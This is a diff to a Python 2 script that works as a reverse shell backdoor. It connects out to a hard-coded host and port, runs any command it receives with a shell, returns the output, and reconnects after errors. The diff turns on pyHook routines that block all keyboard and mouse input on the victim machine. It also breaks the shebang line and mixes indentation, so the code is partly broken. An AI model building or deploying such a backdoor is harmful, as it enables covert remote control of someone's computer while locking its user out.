@@ -1,7 +1,7 @@
-#! /usr/bin/env python
+! /usr/bin/env python
 
-#import pythoncom
-#import pyHook
+import pythoncom
+import pyHook
 import socket
 import subprocess
 import sys
@@ -10,44 +10,36 @@ import time
 HOST = '127.0.0.1'   
 PORT = 22
 
-#def setBlock(event):
-#        return False
+def setBlock(event):
+        return False
 
-#def setUnblock(event):
-#        return True
+def setUnblock(event):
+        return True
 
-#def blockInput():
-#        hookManager = pyHook.HookManager()
-#        hookManager.MouseAll = setBlock
-#        hookManager.KeyAll = setBlock
-#        hookManager.HookMouse()
-#        hookManager.HookKeyboard()
-#        pythoncom.PumpMessages()
+def blockInput():
+    hookManager = pyHook.HookManager()
+    hookManager.MouseAll = setBlock
+    hookManager.KeyAll = setBlock
+    hookManager.HookMouse()
+    hookManager.HookKeyboard()
+    pythoncom.PumpMessages()
 
-#def unblockInput():
-
-#        hookManager = pyHook.HookManager()
-
-#        hookManager.MouseAll = setUnblock
-
-#        hookManager.KeyAll = setUnblock
-
-#        hookManager.HookMouse()
-
-#        hookManager.HookKeyboard()
-
-#        pythoncom.PumpMessages()
+def unblockInput():
+    hookManager = pyHook.HookManager()
+    hookManager.MouseAll = setUnblock
+    hookManager.KeyAll = setUnblock
+    hookManager.HookMouse()
+    hookManager.HookKeyboard()
+    pythoncom.PumpMessages()
 
 
 
 
 def connect((host, port)):
 
-        socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+    socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	socketHolder.connect((host, port))
-
-        return socketHolder
+    return socketHolder
 
 
 
@@ -55,9 +47,6 @@ def connect((host, port)):
 def run_shell_cmd(socketHolder):
 
 	data = socketHolder.recv(1024)
-
-
-
 
 	if data:
 
@@ -79,9 +68,6 @@ def run_shell_cmd(socketHolder):
 
 			return True
 
-
-
-
 		else:
 
 			proc = subprocess.Popen(data, shell=True,
@@ -90,11 +76,7 @@ def run_shell_cmd(socketHolder):
 
 				stdin=subprocess.PIPE)
 
-			
-
 			stdout_value = proc.stdout.read() + proc.stderr.read()
-
-			
 
 			socketHolder.send(stdout_value)
 
@@ -106,14 +88,9 @@ def run_shell_cmd(socketHolder):
 
 		socketHolder = connect((HOST,PORT))
 
-
-
-
 def main():
 
 	socketAlive = True
-
-	
 
         while socketAlive:
 
@@ -134,9 +111,6 @@ def main():
                 except socket.error:
 
                         pass
-
-
-
 
 if __name__ == "__main__":
 
